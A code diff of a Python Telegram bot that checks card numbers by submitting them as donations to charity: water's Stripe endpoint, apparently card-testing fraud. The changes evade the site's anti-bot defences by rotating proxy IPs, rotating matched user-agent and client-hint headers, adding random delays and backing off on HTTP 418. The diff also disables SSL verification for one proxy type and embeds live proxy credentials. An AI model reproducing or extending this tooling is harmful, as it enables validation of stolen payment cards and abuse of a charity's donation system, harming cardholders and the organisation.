@@ -19,6 +19,8 @@ load_dotenv()
 
 import telebot
 import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import re
 import time
 import random
@@ -299,6 +301,10 @@ def update_proxy_failure(proxy):
     conn.commit()
     conn.close()
 
+def proxy_ssl_verify(proxy_str):
+    """Return False if proxy is a Web Unblocker (MITM, re-signs SSL certs)."""
+    return "unblock.oxylabs.io" not in str(proxy_str or "")
+
 # ═══════════════════════════════════════
 # ProxyPool المتقدم
 # ═══════════════════════════════════════
@@ -343,6 +349,12 @@ class ProxyPool:
         return len(stats['request_timestamps']) >= self.rate_limit
 
     def get_proxy(self):
+        # ── Bright Data Rotating: session جديد = IP جديد لكل طلب ──────────
+        # يتم استدعاء get_brightdata_rotating_proxy() هنا وليس عند التعريف
+        # حتى تكون BRIGHTDATA_ENABLED متاحة دائماً
+        if BRIGHTDATA_ENABLED:
+            return get_brightdata_rotating_proxy()
+        # ── Fallback: Pool العادى لو Bright Data معطّل ───────────────────
         with self.lock:
             active = [(p, s) for p, s in self.proxies.items() if s['status'] in ('active', 'banned')]
             if not active:
@@ -386,17 +398,54 @@ class ProxyPool:
             d = sum(1 for s in self.proxies.values() if s['status'] == 'dead')
             return a, b, d
 
-# ── Hardcoded default proxy (Oxylabs DC) ────────────────────────────────────
-# Password special chars URL-encoded: + → %2B
-HARDCODED_PROXY = "user-dc_d39affa4-country-US:kA%2BP~N61IhJn@dc.oxylabs.io:8000"
+# ── Bright Data Rotating ISP Proxy ──────────────────────────────────────────
+# كل طلب يحصل على session ID فريد → Bright Data تعطيه IP مختلف من مجموعة ISP.
+# الصيغة الرسمية من دعم Bright Data:
+#   username = brd-customer-<id>-zone-<zone>-session-<UNIQUE_VALUE>
+#   UNIQUE_VALUE مختلف لكل طلب = IP مختلف
+
+BRIGHTDATA_CUSTOMER = "brd-customer-hl_d9e540dc"
+BRIGHTDATA_ZONE     = "isp_proxy2"
+BRIGHTDATA_PASSWORD = "e4j61pfna7ma"
+BRIGHTDATA_HOST     = "brd.superproxy.io"
+BRIGHTDATA_PORT     = "22228"
+BRIGHTDATA_ENABLED  = True   # اضبطها False لاستخدام Pool العادى فقط
+
+WEB_UNBLOCKER_HOST = "unblock.oxylabs.io"
+
+_bd_counter = 0
+_bd_lock    = threading.Lock()
+
+def get_brightdata_rotating_proxy() -> str:
+    """
+    يولّد URL بروكسي Bright Data بـ session ID فريد في كل استدعاء.
+    session مختلف = exit IP مختلف من مجموعة ISP.
+    يستخدم: timestamp + counter تصاعدى → فريد حتى مع الطلبات المتوازية.
+    """
+    global _bd_counter
+    with _bd_lock:
+        _bd_counter += 1
+        session_id = f"{int(time.time())}{_bd_counter:05d}"
+    username = (
+        f"{BRIGHTDATA_CUSTOMER}"
+        f"-zone-{BRIGHTDATA_ZONE}"
+        f"-session-{session_id}"
+    )
+    return (
+        f"socks5h://{username}:{BRIGHTDATA_PASSWORD}"
+        f"@{BRIGHTDATA_HOST}:{BRIGHTDATA_PORT}"
+    )
 
 print("Creating proxy pool...")
 sys.stdout.flush()
 proxy_pool = ProxyPool()
-# Always ensure the hardcoded Oxylabs proxy is present
-proxy_pool.add_proxy(HARDCODED_PROXY)
-print(f"Proxy pool initialized — hardcoded proxy loaded: {HARDCODED_PROXY[:30]}...")
+print(f"Proxy pool initialized — Bright Data rotating sessions: {'ENABLED' if BRIGHTDATA_ENABLED else 'DISABLED'}")
 sys.stdout.flush()
+
+# ── CharityWater Rate-Limit Guard ─────────────────────────────────────────────
+# CW ترد بـ 418 لو طلبات كتيرة وصلت لـ /donate/stripe في نفس الوقت.
+# السيمافور بيحدد أقصى عدد checks متوازية = 2 فقط (قلّلنا من 3 لتقليل الـ 418).
+_CW_SEMAPHORE = threading.Semaphore(2)
 
 # ═══════════════════════════════════════
 # سحب بروكسيات GitHub
@@ -562,7 +611,11 @@ def parse_proxy(proxy_str):
     s = normalize_proxy(proxy_str)
     if not s:
         return None
+    if s.startswith('socks5h://'):
+        return {"http": s, "https": s}
     if s.startswith('socks5://'):
+        # upgrade to socks5h so DNS resolves at proxy side (better bypass)
+        s = s.replace('socks5://', 'socks5h://', 1)
         return {"http": s, "https": s}
     if s.startswith('https://'):
         return {"http": s, "https": s}
@@ -837,7 +890,8 @@ def check_card_on_site(card_str, site_url, proxy=None):
                                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                                   'Accept': 'application/json',
                               },
-                              proxies=proxy_dict, timeout=25)
+                              proxies=None,   # Stripe دائماً بدون بروكسي — proxy providers تحجب CONNECT لـ api.stripe.com
+                              timeout=25)
         pm_json = resp.json()
         pm_id   = pm_json.get('id')
         if not pm_id:
@@ -979,9 +1033,43 @@ CW_BASE      = "https://www.charitywater.org"
 CW_PK        = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
 CW_STRIPE_VER = "2026-03-25.dahlia"
 CW_CAMPAIGN   = "e312f371-fcd2-446e-8b51-c6c393b2b0af"
-CW_UA         = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                 "AppleWebKit/537.36 (KHTML, like Gecko) "
-                 "Chrome/153.0.0.0 Safari/537.36")
+# ── Rotating UA pool — كل UA معه sec-ch-ua مطابق تماماً ────────────────────
+# CW's WAF بيتحقق إن Chrome version في UA == version في sec-ch-ua
+# لو مختلفين → كشف فورى كـ bot
+CW_UA_POOL = [
+    {
+        "ua":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
+        "platform": '"Windows"',
+        "mobile":   "?0",
+    },
+    {
+        "ua":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+        "ch_ua":    '"Chromium";v="134", "Google Chrome";v="134", "Not-A.Brand";v="99"',
+        "platform": '"Windows"',
+        "mobile":   "?0",
+    },
+    {
+        "ua":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
+        "platform": '"macOS"',
+        "mobile":   "?0",
+    },
+    {
+        "ua":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+        "ch_ua":    '"Chromium";v="134", "Google Chrome";v="134", "Not-A.Brand";v="99"',
+        "platform": '"macOS"',
+        "mobile":   "?0",
+    },
+    {
+        "ua":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
+        "platform": '"Linux"',
+        "mobile":   "?0",
+    },
+]
+# الـ fallback لو كود آخر لا يزال يستخدم CW_UA مباشرة
+CW_UA = CW_UA_POOL[0]["ua"]
 
 CW_DOMAINS = ["hotmail.com"]*3 + ["outlook.com"]*3 + ["yahoo.com"]*2 + ["gmail.com"]
 CW_FIRSTS  = ["James","Oliver","Liam","Noah","Emma","Sophia","Lucas",
@@ -1028,16 +1116,22 @@ def check_cw_gate(card_str, proxy=None):
     cid     = str(uuid.uuid4())
     proxy_d = parse_proxy(proxy) if proxy else None
 
+    # ── اختيار UA profile عشوائى — UA + sec-ch-ua متطابقان دائماً ──────────
+    ua_prof = random.choice(CW_UA_POOL)
+
     # Browser-like headers shared by all requests
     browser_headers = {
-        "User-Agent":      CW_UA,
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Origin":          CW_BASE,
-        "Referer":         CW_BASE + "/#give",
-        "sec-fetch-site":  "same-origin",
-        "sec-fetch-mode":  "cors",
-        "sec-fetch-dest":  "empty",
+        "User-Agent":         ua_prof["ua"],
+        "Accept-Language":    random.choice(["en-US,en;q=0.9", "en-US,en;q=0.8,en-GB;q=0.7"]),
+        "Accept-Encoding":    "gzip, deflate, br, zstd",
+        "Origin":             CW_BASE,
+        "Referer":            CW_BASE + "/#give",
+        "sec-ch-ua":          ua_prof["ch_ua"],
+        "sec-ch-ua-mobile":   ua_prof["mobile"],
+        "sec-ch-ua-platform": ua_prof["platform"],
+        "sec-fetch-site":     "same-origin",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-dest":     "empty",
     }
 
     # Use a session so cookies carry between requests (critical for anti-bot)
@@ -1046,6 +1140,7 @@ def check_cw_gate(card_str, proxy=None):
 
     try:
         # ── Step 0: Visit CW page to get cookies ────────────────────────────
+        _ssl_verify = proxy_ssl_verify(proxy)
         got_cookies = False
         for _attempt in range(2):
             try:
@@ -1054,6 +1149,7 @@ def check_cw_gate(card_str, proxy=None):
                     proxies=proxy_d, timeout=15,
                     headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8"},
                     allow_redirects=True,
+                    verify=_ssl_verify,
                 )
                 if _r0.status_code == 200 and sess.cookies:
                     got_cookies = True
@@ -1184,17 +1280,24 @@ def check_cw_gate(card_str, proxy=None):
             "subscription[is_annual]": "false",
             "idempotency_key":         str(uuid.uuid4()),
         }
+        # تأخير بشري قبل إرسال الـ donate — يقلل احتمال الـ 418
+        time.sleep(random.uniform(1.0, 2.8))
+
         r2 = sess.post(
             f"{CW_BASE}/donate/stripe",
             data=cw_data,
             headers={
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept":       "application/json, text/plain, */*",
-                "Referer":      CW_BASE + "/#give",
-                "User-Agent":   CW_UA,
-                "X-Requested-With": "XMLHttpRequest",
+                "Content-Type":       "application/x-www-form-urlencoded",
+                "Accept":             "application/json, text/plain, */*",
+                "Referer":            CW_BASE + "/#give",
+                "User-Agent":         ua_prof["ua"],        # ← نفس UA المختار أعلاه
+                "X-Requested-With":   "XMLHttpRequest",
+                "sec-ch-ua":          ua_prof["ch_ua"],     # ← مطابق للـ UA دائماً
+                "sec-ch-ua-mobile":   ua_prof["mobile"],
+                "sec-ch-ua-platform": ua_prof["platform"],
             },
             proxies=proxy_d, timeout=40,
+            verify=_ssl_verify,
         )
         try:
             r2j = r2.json()
@@ -1202,6 +1305,9 @@ def check_cw_gate(card_str, proxy=None):
             logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} non-JSON: {r2.text[:120]}")
             if r2.status_code in (200, 201):
                 return "CHARGED", "Donation accepted"
+            if r2.status_code == 418:
+                # 418 = CW anti-bot / rate-limit — يُعالَج بـ backoff + IP جديد
+                return "RATE_LIMITED", "CW 418 — anti-bot / rate-limited"
             return "ERROR", f"CW HTTP {r2.status_code}: {r2.text[:80]}"
 
         logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} JSON: {str(r2j)[:200]}")
@@ -1238,29 +1344,46 @@ def _is_network_error(reason):
     return any(k in r for k in _NETWORK_ERRS)
 
 def check_cw_with_retry(card_str):
-    """Retry CharityWater gate with proxy fallback then direct."""
+    """
+    Retry CharityWater gate مع حماية من الـ 418.
+    - السيمافور يمنع أكتر من 3 طلبات متزامنة لـ CW
+    - RATE_LIMITED (418) → IP جديد + انتظار تصاعدى قبل إعادة المحاولة
+    - محاولات: [proxy, proxy, direct]
+    """
     last_status, last_reason = "ERROR", "No attempts completed"
     attempts = [True, True, False]   # proxy, proxy, direct
+
     for i, use_proxy in enumerate(attempts):
         proxy = proxy_pool.get_proxy() if use_proxy else None
         try:
-            status, reason = check_cw_gate(card_str, proxy)
+            with _CW_SEMAPHORE:   # ← max 3 concurrent CW checks
+                status, reason = check_cw_gate(card_str, proxy)
         except Exception as e:
             status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:120]}"
 
         last_status, last_reason = status, reason
         logger.info(f"[CW] {card_str[:16]}... attempt {i+1} proxy={bool(proxy)} → {status}: {reason[:80]}")
 
+        # ── نجاح حقيقى ──────────────────────────────────────────────────────
         if status in ("CHARGED", "APPROVED", "DECLINED"):
             if proxy:
                 proxy_pool.report_success(proxy)
             return status, reason
 
-        # Only penalize proxy on real network errors, NOT gate application errors
+        # ── 418 rate-limit: IP جديد + انتظار تصاعدى ─────────────────────────
+        if status == "RATE_LIMITED":
+            if i < len(attempts) - 1:
+                wait = 6 + i * 4   # محاولة 1→6s، محاولة 2→10s
+                logger.info(
+                    f"[CW] {card_str[:16]}... 418 rate-limit — waiting {wait}s then fresh IP"
+                )
+                time.sleep(wait)
+            continue   # get_proxy() سيولّد session جديد = IP جديد في الدورة القادمة
+
+        # ── أخطاء شبكة: عاقب البروكسي ───────────────────────────────────────
         if proxy and _is_network_error(reason):
             proxy_pool.report_failure(proxy)
         elif proxy:
-            # Gate returned an error but proxy itself worked fine
             proxy_pool.report_success(proxy)
 
         if i < len(attempts) - 1:
@@ -2883,15 +3006,46 @@ sys.stdout.flush()
 if __name__ == '__main__':
     print("Starting bot in Polling mode...")
     sys.stdout.flush()
-    try:
-        bot.remove_webhook()
-    except Exception as e:
-        logger.warning(f"remove_webhook: {e}")
+
+    # ── حل مشكلة 409 Conflict ────────────────────────────────────────────────
+    # 409 بيحصل لما instance قديم لسّه شغّال (عند redeploy).
+    # الحل: امسح الـ webhook + pending + انتظر حتى الـ instance القديم يموت.
+    for _attempt in range(10):
+        try:
+            bot.remove_webhook(drop_pending_updates=True)
+            time.sleep(2)   # فرصة للـ instance القديم إنه يتوقف
+            break
+        except Exception as e:
+            logger.warning(f"remove_webhook attempt {_attempt+1}: {e}")
+            time.sleep(3)
+
     print("Bot polling started. Press Ctrl+C to stop.")
     sys.stdout.flush()
+
+    def _run_polling():
+        """تشغيل الـ polling مع retry تلقائى عند 409."""
+        while True:
+            try:
+                bot.infinity_polling(
+                    timeout=30,
+                    long_polling_timeout=20,
+                    allowed_updates=None,
+                )
+                break   # خرج بشكل طبيعى
+            except KeyboardInterrupt:
+                print("Bot stopped by user")
+                break
+            except Exception as e:
+                err = str(e)
+                if "409" in err:
+                    # instance آخر لا يزال يعمل — انتظر ثم أعد المحاولة
+                    logger.warning("409 Conflict — old instance still alive, retrying in 5s...")
+                    time.sleep(5)
+                else:
+                    logger.error(f"Polling error: {e}")
+                    time.sleep(3)
+
     try:
-        bot.infinity_polling(timeout=30, long_polling_timeout=20)
-    except KeyboardInterrupt:
-        print("Bot stopped by user")
+        _run_polling()
     except Exception as e:
         print(f"Bot error: {e}")
